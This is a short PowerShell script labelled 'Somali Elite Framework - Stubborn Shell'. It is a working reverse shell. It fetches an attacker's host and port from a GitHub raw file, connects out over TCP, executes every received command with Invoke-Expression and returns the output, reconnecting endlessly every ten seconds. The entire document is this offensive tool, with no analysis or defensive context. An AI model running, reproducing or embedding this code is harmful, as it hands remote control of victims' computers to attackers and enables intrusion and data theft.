# Somali Elite Framework - Stubborn Shell
$CONN_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/connection.txt"

while($true) {
    try {
        $RAW_DATA = (New-Object Net.WebClient).DownloadString($CONN_URL).Trim()
        $HOST_NAME = $RAW_DATA.Split(":")[0]
        $PORT = $RAW_DATA.Split(":")[1]

        $c = New-Object System.Net.Sockets.TCPClient($HOST_NAME, $PORT)
        $s = $c.GetStream(); [byte[]]$b = 0..65535|% {0}
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
            $sb = (iex $d 2>&1 | Out-String )
            $sb2 = $sb + 'PS ' + (pwd).Path + '> '
            $x = ([text.encoding]::ASCII).GetBytes($sb2)
            $s.Write($x, 0, $x.Length); $s.Flush()
        }
        $c.Close()
    } catch { Start-Sleep -Seconds 10 }
}
